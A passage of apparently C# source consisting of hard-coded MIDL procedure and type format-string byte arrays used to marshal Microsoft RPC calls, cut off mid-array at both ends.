                0x00,0x00,0x00,0x00,0x4c,0x00,0xc8,0xff,0x5c,0x5b,0x1a,0x07,0x08,0x00,0xd2,0xff,0x00,0x00,0x08,0x40,0x5c,0x5b,0x1a,0x03,0x40,0x00,0x00,0x00,0x0c,0x00,
                0x36,0x4c,0x00,0x99,0xff,0x08,0x40,0x36,0x36,0x5b,0x12,0x00,0xec,0xff,0x12,0x00,0x00,0xfc,0x12,0x00,0xd8,0xff,0x1a,0x07,0x90,0x00,0x00,0x00,0x20,0x00,
                0x4c,0x00,0xf0,0xfb,0x4c,0x00,0xec,0xfb,0x36,0x4c,0x00,0x69,0xfc,0x4c,0x00,0x65,0xfc,0x36,0x4c,0x00,0xc8,0xfc,0x08,0x08,0x08,0x40,0x36,0x08,0x40,0x5b,
                0x12,0x00,0xf2,0xfc,0x12,0x00,0x24,0xfd,0x12,0x00,0xb2,0xff,0x1b,0x00,0x01,0x00,0x19,0x00,0x04,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x01,0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,0x06,0x00,0x08,0x08,0x36,0x5b,0x12,0x20,0xdc,0xff,0x1a,0x03,0x10,0x00,0x00,0x00,0x00,0x00,0x4c,0x00,
                0xe6,0xff,0x5c,0x5b,0x15,0x07,0x20,0x00,0x4c,0x00,0x8e,0xfb,0x0b,0x0b,0x5c,0x5b,0x1b,0x07,0x20,0x00,0x09,0x00,0xf8,0xff,0x11,0x00,0x01,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x10,0x00,0x4c,0x00,0xde,0xff,0x5c,0x5b,0x17,0x07,0x10,0x00,0xe2,0xff,0x08,0x08,0x08,0x08,0x5c,0x5b,0xb1,0x07,0x30,0x00,0x00,0x00,
                0x00,0x00,0x0b,0x4c,0x00,0xf7,0xfe,0x5b,0x1a,0x07,0x58,0x00,0x00,0x00,0x10,0x00,0x36,0x08,0x40,0x4c,0x00,0x3f,0xfe,0x08,0x40,0x4c,0x00,0xdf,0xff,0x5b,
                0x12,0x00,0x5c,0xfc,0x21,0x07,0x00,0x00,0x19,0x00,0x94,0x00,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0xff,0xff,0xff,0xff,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x4c,0x00,0xc0,0xff,0x5c,0x5b,0x1a,0x07,0xa8,0x00,0x00,0x00,0x26,0x00,0x4c,0x00,0x06,0xfb,0x4c,0x00,
                0x02,0xfb,0x36,0x4c,0x00,0x7f,0xfb,0x4c,0x00,0x7b,0xfb,0x36,0x4c,0x00,0xde,0xfb,0x08,0x08,0x08,0x40,0x36,0x08,0x08,0x08,0x08,0x36,0x08,0x40,0x5c,0x5b,
                0x12,0x00,0x02,0xfc,0x12,0x00,0x70,0xff,0x12,0x00,0xc2,0xfe,0x12,0x20,0x9c,0xff,0x1a,0x03,0x18,0x00,0x00,0x00,0x00,0x00,0x08,0x0d,0x4c,0x00,0x16,0xff,
                0x5c,0x5b,0xb1,0x07,0x48,0x00,0x00,0x00,0x00,0x00,0x0b,0x4c,0x00,0x59,0xfe,0x08,0x08,0x08,0x40,0x0b,0x5c,0x5b,0x1a,0x07,0x70,0x00,0x00,0x00,0x10,0x00,
                0x36,0x08,0x40,0x4c,0x00,0x9b,0xfd,0x08,0x40,0x4c,0x00,0xd9,0xff,0x5b,0x12,0x00,0xb8,0xfb,0x21,0x07,0x00,0x00,0x19,0x00,0x94,0x00,0x11,0x00,0x01,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x4c,0x00,0xc0,0xff,0x5c,0x5b,
                0x1a,0x07,0xa8,0x00,0x00,0x00,0x26,0x00,0x4c,0x00,0x62,0xfa,0x4c,0x00,0x5e,0xfa,0x36,0x4c,0x00,0xdb,0xfa,0x4c,0x00,0xd7,0xfa,0x36,0x4c,0x00,0x3a,0xfb,
                0x08,0x08,0x08,0x40,0x36,0x08,0x08,0x08,0x08,0x36,0x08,0x40,0x5c,0x5b,0x12,0x00,0x5e,0xfb,0x12,0x00,0xcc,0xfe,0x12,0x00,0x1e,0xfe,0x12,0x20,0x9c,0xff,
                0x11,0x00,0x02,0x00,0x2b,0x09,0x29,0x00,0x08,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x20,0x00,0x01,0x00,0x01,0x00,
                0x00,0x00,0x2e,0x00,0xff,0xff,0x21,0x03,0x00,0x00,0x19,0x00,0x14,0x00,0x11,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x10,0x27,0x00,0x00,0xff,0xff,0xff,0xff,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x12,0x08,0x25,0x5c,0x5c,0x5b,0x1a,0x03,0x20,0x00,0x00,0x00,0x0a,0x00,0x08,0x08,0x08,0x08,
                0x08,0x08,0x36,0x5b,0x12,0x20,0xc4,0xff,0x11,0x04,0x02,0x00,0x2b,0x09,0x29,0x54,0x18,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x02,0x00,0x08,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x54,0x00,0xff,0xff,0x1a,0x03,0x18,0x00,0x00,0x00,0x08,0x00,0x08,0x40,0x36,0x36,0x5c,0x5b,0x12,0x08,
                0x25,0x5c,0x12,0x08,0x25,0x5c,0x21,0x03,0x00,0x00,0x19,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x4c,0x00,0xc4,0xff,0x5c,0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,0x06,0x00,0x08,0x40,0x36,0x5b,
                0x12,0x20,0xc8,0xff,0x1a,0x03,0x08,0x00,0x00,0x00,0x04,0x00,0x36,0x5b,0x12,0x00,0xe4,0xff,0x11,0x00,0x02,0x00,0x2b,0x09,0x29,0x00,0x08,0x00,0x01,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x10,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x04,0x00,0xff,0xff,0x1a,0x03,0x10,0x00,0x00,0x00,
                0x06,0x00,0x36,0x08,0x40,0x5b,0x12,0x08,0x25,0x5c,0x11,0x04,0x02,0x00,0x2b,0x09,0x29,0x54,0x18,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x02,0x00,0x10,0x00,0x04,0x00,0x01,0x00,0x00,0x00,0x64,0x00,0x02,0x00,0x00,0x00,0xd8,0x00,0x03,0x00,0x00,0x00,0x4c,0x01,0xff,0xff,0xff,0xff,
                0x94,0x01,0xff,0xff,0x1a,0x03,0x30,0x00,0x00,0x00,0x0a,0x00,0x36,0x36,0x36,0x36,0x36,0x08,0x08,0x5b,0x12,0x08,0x25,0x5c,0x12,0x08,0x25,0x5c,0x12,0x08,
                0x25,0x5c,0x12,0x08,0x25,0x5c,0x12,0x08,0x25,0x5c,0x21,0x03,0x00,0x00,0x19,0x00,0x00,0x00,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x10,0x27,0x00,0x00,
                0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x4c,0x00,0xb6,0xff,0x5c,0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,0x06,0x00,
                0x08,0x40,0x36,0x5b,0x12,0x20,0xc8,0xff,0x1a,0x03,0x88,0x00,0x00,0x00,0x1e,0x00,0x36,0x36,0x36,0x36,0x36,0x36,0x36,0x08,0x08,0x08,0x4c,0x00,0x70,0xf8,
                0x4c,0x00,0x6c,0xf8,0x4c,0x00,0x68,0xf8,0x4c,0x00,0x64,0xf8,0x40,0x5b,0x12,0x08,0x25,0x5c,0x12,0x08,0x25,0x5c,0x12,0x08,0x25,0x5c,0x12,0x08,0x25,0x5c,
                0x12,0x08,0x25,0x5c,0x12,0x08,0x25,0x5c,0x12,0x08,0x25,0x5c,0x21,0x03,0x00,0x00,0x19,0x00,0x00,0x00,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x10,0x27,
                0x00,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x4c,0x00,0x9a,0xff,0x5c,0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,
                0x06,0x00,0x08,0x40,0x36,0x5b,0x12,0x20,0xc8,0xff,0x1a,0x03,0x88,0x00,0x00,0x00,0x1e,0x00,0x36,0x36,0x36,0x36,0x36,0x36,0x36,0x08,0x08,0x08,0x08,0x4c,
                0x00,0xf5,0xf7,0x4c,0x00,0xf1,0xf7,0x4c,0x00,0xed,0xf7,0x4c,0x00,0xe9,0xf7,0x5b,0x12,0x08,0x25,0x5c,0x12,0x08,0x25,0x5c,0x12,0x08,0x25,0x5c,0x12,0x08,
                0x25,0x5c,0x12,0x08,0x25,0x5c,0x12,0x08,0x25,0x5c,0x12,0x08,0x25,0x5c,0x21,0x03,0x00,0x00,0x19,0x00,0x00,0x00,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,
                0x10,0x27,0x00,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x4c,0x00,0x9a,0xff,0x5c,0x5b,0x1a,0x03,0x10,0x00,
                0x00,0x00,0x06,0x00,0x08,0x40,0x36,0x5b,0x12,0x20,0xc8,0xff,0x1a,0x03,0x20,0x00,0x00,0x00,0x0a,0x00,0x08,0x08,0x08,0x08,0x08,0x08,0x36,0x5b,0x12,0x08,
                0x25,0x5c,0x21,0x03,0x00,0x00,0x19,0x00,0x00,0x00,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x10,0x27,0x00,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x4c,0x00,0xc6,0xff,0x5c,0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,0x06,0x00,0x08,0x40,0x36,0x5b,0x12,0x20,0xc8,0xff,
                0x00
            };

            private static byte[] MIDL_ProcFormatStringx86 = new byte[] {
                0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x00,0x32,0x00,0x00,0x00,0x44,0x00,0x40,0x00,0x47,0x05,0x08,0x47,0x01,0x00,0x01,0x00,0x00,0x00,0x0a,0x00,
                0x04,0x00,0x02,0x00,0x0b,0x00,0x08,0x00,0x18,0x00,0x13,0x20,0x0c,0x00,0x3a,0x00,0x10,0x01,0x10,0x00,0x42,0x00,0x70,0x00,0x14,0x00,0x08,0x00,0x00,0x48,
                0x00,0x00,0x00,0x00,0x01,0x00,0x08,0x00,0x30,0xe0,0x00,0x00,0x00,0x00,0x38,0x00,0x40,0x00,0x44,0x02,0x08,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x01,
                0x00,0x00,0x4a,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x02,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,
                0x08,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x03,0x00,0x18,0x00,0x30,0x40,0x00,0x00,0x00,0x00,0x2c,0x00,0x24,0x00,0x47,0x06,
                0x08,0x47,0x01,0x00,0x01,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x4e,0x00,0x48,0x00,0x04,0x00,0x08,0x00,0x0b,0x01,0x08,0x00,0x56,0x00,0x50,0x21,0x0c,0x00,
                0x08,0x00,0x13,0x01,0x10,0x00,0xbe,0x02,0x70,0x00,0x14,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x04,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x40,0x00,0x08,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x05,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x40,0x00,0x08,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x06,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,
                0x08,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x07,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x41,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x08,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x41,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x09,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x41,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0a,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x41,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x48,0x00,0x00,0x00,0x00,0x0b,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,
                0x00,0x00,0x00,0x00,0x0c,0x00,0x18,0x00,0x30,0x40,0x00,0x00,0x00,0x00,0x2c,0x00,0x24,0x00,0x47,0x06,0x08,0x47,0x01,0x00,0x01,0x00,0x00,0x00,0x08,0x00,
                0x00,0x00,0x4e,0x00,0x48,0x00,0x04,0x00,0x08,0x00,0x0b,0x01,0x08,0x00,0xde,0x05,0x50,0x21,0x0c,0x00,0x08,0x00,0x13,0x21,0x10,0x00,0x46,0x06,0x70,0x00,
                0x14,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0d,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x41,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0e,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x41,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x48,0x00,0x00,0x00,0x00,0x0f,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,
                0x00,0x00,0x00,0x00,0x10,0x00,0x18,0x00,0x30,0x40,0x00,0x00,0x00,0x00,0x2c,0x00,0x24,0x00,0x47,0x06,0x08,0x47,0x01,0x00,0x01,0x00,0x00,0x00,0x08,0x00,
                0x00,0x00,0x4e,0x00,0x48,0x00,0x04,0x00,0x08,0x00,0x0b,0x01,0x08,0x00,0xe6,0x06,0x50,0x21,0x0c,0x00,0x08,0x00,0x13,0x21,0x10,0x00,0x1e,0x07,0x70,0x00,
                0x14,0x00,0x08,0x00,0x00
            };

            private static byte[] MIDL_TypeFormatStringx86 = new byte[] {
                0x00,0x00,0x12,0x00,0x08,0x00,0x1d,0x00,0x08,0x00,0x01,0x5b,0x15,0x03,0x10,0x00,0x08,0x06,0x06,0x4c,0x00,0xf1,0xff,0x5b,0x12,0x00,0x18,0x00,0x1b,0x00,
                0x01,0x00,0x09,0x00,0xfc,0xff,0x11,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x10,0x27,0x00,0x00,0x01,0x5b,0x17,0x03,0x04,0x00,0xe6,0xff,0x08,0x5b,0x11,0x14,
                0xdc,0xff,0x11,0x04,0x02,0x00,0x30,0xa0,0x00,0x00,0x11,0x04,0x02,0x00,0x30,0xe1,0x00,0x00,0x30,0x41,0x00,0x00,0x11,0x00,0x02,0x00,0x2b,0x09,0x29,0x00,
                0x04,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x88,0x00,0x05,0x00,0x04,0x00,0x00,0x00,0x64,0x01,0x05,0x00,0x00,0x00,
                0x7c,0x01,0x07,0x00,0x00,0x00,0xa0,0x01,0x08,0x00,0x00,0x00,0xc0,0x01,0x0a,0x00,0x00,0x00,0xf2,0x01,0xff,0xff,0x15,0x07,0x18,0x00,0x0b,0x0b,0x0b,0x5b,
                0x1b,0x00,0x01,0x00,0x19,0x00,0x04,0x00,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x10,0x27,0x00,0x00,0x01,0x5b,0x16,0x03,0x0c,0x00,0x4b,0x5c,0x46,0x5c,
                0x08,0x00,0x08,0x00,0x12,0x20,0xdc,0xff,0x5b,0x08,0x08,0x08,0x5c,0x5b,0x1b,0x03,0x0c,0x00,0x19,0x00,0x00,0x00,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x10,0x00,0x4b,0x5c,0x48,0x49,0x0c,0x00,0x00,0x00,0x01,0x00,0x08,0x00,0x08,0x00,0x12,0x20,0xb0,0xff,0x5b,0x4c,0x00,0xc1,0xff,0x5b,0x16,0x03,
                0x08,0x00,0x4b,0x5c,0x46,0x5c,0x04,0x00,0x04,0x00,0x12,0x20,0xc6,0xff,0x5b,0x08,0x08,0x5b,0x1d,0x00,0x1c,0x00,0x02,0x5b,0x15,0x00,0x1c,0x00,0x4c,0x00,
                0xf4,0xff,0x5c,0x5b,0x1b,0x01,0x02,0x00,0x09,0x57,0xfc,0xff,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0xa0,0x00,0x05,0x5b,0x17,0x03,0x38,0x00,
                0xe6,0xff,0x08,0x08,0x4c,0x00,0xda,0xfe,0x4c,0x00,0xd2,0xff,0x08,0x5b,0x15,0x07,0x18,0x00,0x4c,0x00,0xcc,0xfe,0x0b,0x5b,0x1b,0x07,0x18,0x00,0x09,0x00,
                0xf8,0xff,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x4c,0x00,0xe0,0xff,0x5c,0x5b,0x17,0x07,0x10,0x00,0xe2,0xff,0x08,0x08,0x08,0x08,
                0x5c,0x5b,0x1b,0x03,0x04,0x00,0x09,0x00,0xfc,0xff,0x11,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x08,0x5b,0x17,0x03,0x0c,0x00,0xe6,0xff,
                0x08,0x08,0x08,0x5b,0xb1,0x07,0x60,0x00,0x00,0x00,0x1c,0x00,0x4c,0x00,0x78,0xfe,0x4c,0x00,0x74,0xfe,0x36,0x40,0x4c,0x00,0xf0,0xfe,0x36,0x36,0x4c,0x00,
                0x4a,0xff,0x08,0x08,0x08,0x08,0x5c,0x5b,0x11,0x00,0x7a,0xff,0x12,0x00,0xac,0xff,0x12,0x00,0xca,0xff,0x1b,0x00,0x01,0x00,0x09,0x00,0xfc,0xff,0x11,0x00,
                0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x02,0x5b,0x17,0x03,0x04,0x00,0xe6,0xff,0x08,0x5b,0xb1,0x07,0x78,0x00,0x00,0x00,0x0e,0x00,0x4c,0x00,
                0x2c,0xfe,0x36,0x40,0x4c,0x00,0xa4,0xff,0x5c,0x5b,0x11,0x00,0xe2,0xff,0x15,0x07,0x08,0x00,0x0b,0x5b,0xb1,0x07,0x60,0x00,0x00,0x00,0x1c,0x00,0x4c,0x00,
                0x0e,0xfe,0x4c,0x00,0x0a,0xfe,0x36,0x40,0x4c,0x00,0x86,0xfe,0x36,0x08,0x08,0x08,0x08,0x40,0x4c,0x00,0xdc,0xff,0x5c,0x5b,0x11,0x00,0x10,0xff,0x12,0x00,
                0x42,0xff,0xb1,0x07,0x88,0x00,0x00,0x00,0x14,0x00,0x4c,0x00,0xe4,0xfd,0x36,0x40,0x4c,0x00,0x5c,0xff,0x36,0x36,0x4c,0x00,0xba,0xfe,0x5c,0x5b,0x11,0x00,
                0x94,0xff,0x12,0x00,0x42,0xff,0x12,0x00,0x3e,0xff,0xb1,0x07,0x70,0x00,0x00,0x00,0x22,0x00,0x4c,0x00,0xbe,0xfd,0x4c,0x00,0xba,0xfd,0x36,0x40,0x4c,0x00,
                0x36,0xfe,0x36,0x08,0x08,0x08,0x08,0x40,0x4c,0x00,0x8c,0xff,0x36,0x36,0x4c,0x00,0x86,0xfe,0x5c,0x5b,0x11,0x00,0xba,0xfe,0x12,0x00,0xec,0xfe,0x12,0x00,
                0x0a,0xff,0x12,0x00,0x06,0xff,0x1a,0x07,0x78,0x00,0x00,0x00,0x24,0x00,0x4c,0x00,0x86,0xfd,0x4c,0x00,0x82,0xfd,0x36,0x40,0x4c,0x00,0xfe,0xfd,0x36,0x08,
                0x08,0x08,0x08,0x40,0x4c,0x00,0x54,0xff,0x36,0x36,0x4c,0x00,0x4e,0xfe,0x08,0x40,0x5c,0x5b,0x11,0x00,0x80,0xfe,0x12,0x00,0xb2,0xfe,0x12,0x00,0xd0,0xfe,
                0x12,0x00,0xcc,0xfe,0x11,0x0c,0x08,0x5c,0x11,0x00,0x02,0x00,0x2b,0x09,0x29,0x54,0x0c,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x02,0x00,0x90,0x00,0x05,0x00,0x01,0x00,0x00,0x00,0x3e,0x01,0x02,0x00,0x00,0x00,0x80,0x01,0x06,0x00,0x00,0x00,0x14,0x02,0x07,0x00,0x00,0x00,0x4a,0x02,
                0x09,0x00,0x00,0x00,0xac,0x02,0xff,0xff,0x1b,0x00,0x01,0x00,0x19,0x00,0x00,0x00,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0x01,0x02,0x5b,
                0x16,0x03,0x08,0x00,0x4b,0x5c,0x46,0x5c,0x04,0x00,0x04,0x00,0x12,0x20,0xdc,0xff,0x5b,0x08,0x08,0x5b,0x1b,0x03,0x08,0x00,0x19,0x00,0x04,0x00,0x11,0x00,
                0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa0,0x00,0x4b,0x5c,0x48,0x49,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x04,0x00,0x12,0x20,0xb2,0xff,0x5b,0x4c,
                0x00,0xc3,0xff,0x5b,0x16,0x03,0x0c,0x00,0x4b,0x5c,0x46,0x5c,0x08,0x00,0x08,0x00,0x12,0x20,0xc6,0xff,0x5b,0x08,0x08,0x08,0x5c,0x5b,0x1b,0x03,0x0c,0x00,
                0x19,0x00,0x0c,0x00,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x4b,0x5c,0x48,0x49,0x0c,0x00,0x00,0x00,0x01,0x00,0x08,0x00,0x08,0x00,
                0x12,0x20,0x9a,0xff,0x5b,0x4c,0x00,0xc1,0xff,0x5b,0xb1,0x07,0x28,0x00,0x00,0x00,0x00,0x00,0x08,0x40,0x0b,0x4c,0x00,0x71,0xfc,0x0b,0x5c,0x5b,0x21,0x07,
                0x00,0x00,0x09,0x00,0xf8,0xff,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x4c,0x00,0xc8,0xff,0x5c,0x5b,0x1a,0x07,0x08,0x00,0xd2,0xff,0x00,0x00,0x08,0x40,0x5c,0x5b,0x16,0x03,0x20,0x00,0x4b,0x5c,0x46,0x5c,
                0x00,0x00,0x00,0x00,0x12,0x00,0xf2,0xff,0x46,0x5c,0x04,0x00,0x04,0x00,0x12,0x00,0x3a,0xfd,0x46,0x5c,0x10,0x00,0x10,0x00,0x12,0x20,0x6a,0xff,0x46,0x5c,
                0x18,0x00,0x18,0x00,0x12,0x00,0x0a,0xfc,0x46,0x5c,0x1c,0x00,0x1c,0x00,0x12,0x00,0xbe,0xff,0x5b,0x08,0x08,0x08,0x08,0x08,0x08,0x08,0x08,0x5b,0xb1,0x07,
                0x78,0x00,0x00,0x00,0x20,0x00,0x4c,0x00,0xea,0xfb,0x4c,0x00,0xe6,0xfb,0x36,0x40,0x4c,0x00,0x62,0xfc,0x4c,0x00,0x5e,0xfc,0x36,0x4c,0x00,0xb9,0xfc,0x08,
                0x08,0x08,0x36,0x08,0x5c,0x5b,0x12,0x00,0xe8,0xfc,0x12,0x00,0x1a,0xfd,0x12,0x00,0x8e,0xff,0x1b,0x00,0x01,0x00,0x19,0x00,0x04,0x00,0x01,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x5b,0x16,0x03,0x0c,0x00,0x4b,0x5c,0x46,0x5c,0x08,0x00,0x08,0x00,0x12,0x20,0xdc,0xff,0x5b,0x08,0x08,0x08,
                0x5c,0x5b,0x15,0x07,0x20,0x00,0x4c,0x00,0x90,0xfb,0x0b,0x0b,0x5c,0x5b,0x1b,0x07,0x20,0x00,0x09,0x00,0xf8,0xff,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x10,0x00,0x4c,0x00,0xde,0xff,0x5c,0x5b,0x17,0x07,0x10,0x00,0xe2,0xff,0x08,0x08,0x08,0x08,0x5c,0x5b,0xb1,0x07,0x30,0x00,0x00,0x00,0x00,0x00,
                0x0b,0x4c,0x00,0xdb,0xfe,0x5b,0xb1,0x07,0x48,0x00,0x00,0x00,0x10,0x00,0x36,0x08,0x4c,0x00,0x4a,0xfe,0x08,0x40,0x4c,0x00,0xe0,0xff,0x5c,0x5b,0x12,0x00,
                0x5a,0xfc,0x21,0x07,0x00,0x00,0x19,0x00,0x80,0x00,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x4c,0x00,0xc0,0xff,0x5c,0x5b,0x1a,0x07,0x90,0x00,0x00,0x00,0x26,0x00,0x4c,0x00,0x08,0xfb,0x4c,0x00,0x04,0xfb,
                0x36,0x40,0x4c,0x00,0x80,0xfb,0x4c,0x00,0x7c,0xfb,0x36,0x4c,0x00,0xd7,0xfb,0x08,0x08,0x08,0x36,0x08,0x08,0x08,0x08,0x36,0x08,0x40,0x5c,0x5b,0x12,0x00,
                0x00,0xfc,0x12,0x00,0x70,0xff,0x12,0x00,0xa6,0xfe,0x12,0x20,0x9c,0xff,0x1a,0x03,0x14,0x00,0x00,0x00,0x00,0x00,0x08,0x0d,0x4c,0x00,0x1e,0xff,0x5c,0x5b,
                0xb1,0x07,0x48,0x00,0x00,0x00,0x00,0x00,0x0b,0x4c,0x00,0x3d,0xfe,0x08,0x08,0x08,0x40,0x0b,0x5c,0x5b,0xb1,0x07,0x60,0x00,0x00,0x00,0x10,0x00,0x36,0x08,
                0x4c,0x00,0xa6,0xfd,0x08,0x40,0x4c,0x00,0xda,0xff,0x5c,0x5b,0x12,0x00,0xb6,0xfb,0x21,0x07,0x00,0x00,0x19,0x00,0x80,0x00,0x11,0x00,0x01,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x10,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x4c,0x00,0xc0,0xff,0x5c,0x5b,0x1a,0x07,
                0x90,0x00,0x00,0x00,0x26,0x00,0x4c,0x00,0x64,0xfa,0x4c,0x00,0x60,0xfa,0x36,0x40,0x4c,0x00,0xdc,0xfa,0x4c,0x00,0xd8,0xfa,0x36,0x4c,0x00,0x33,0xfb,0x08,
                0x08,0x08,0x36,0x08,0x08,0x08,0x08,0x36,0x08,0x40,0x5c,0x5b,0x12,0x00,0x5c,0xfb,0x12,0x00,0xcc,0xfe,0x12,0x00,0x02,0xfe,0x12,0x20,0x9c,0xff,0x11,0x00,
                0x02,0x00,0x2b,0x09,0x29,0x00,0x04,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x1c,0x00,0x01,0x00,0x01,0x00,0x00,0x00,
                0x2e,0x00,0xff,0xff,0x1b,0x03,0x04,0x00,0x19,0x00,0x14,0x00,0x11,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x10,0x27,0x00,0x00,0x4b,0x5c,0x48,0x49,0x04,0x00,
                0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x12,0x08,0x25,0x5c,0x5b,0x08,0x5c,0x5b,0x16,0x03,0x1c,0x00,0x4b,0x5c,0x46,0x5c,0x18,0x00,0x18,0x00,0x12,0x20,
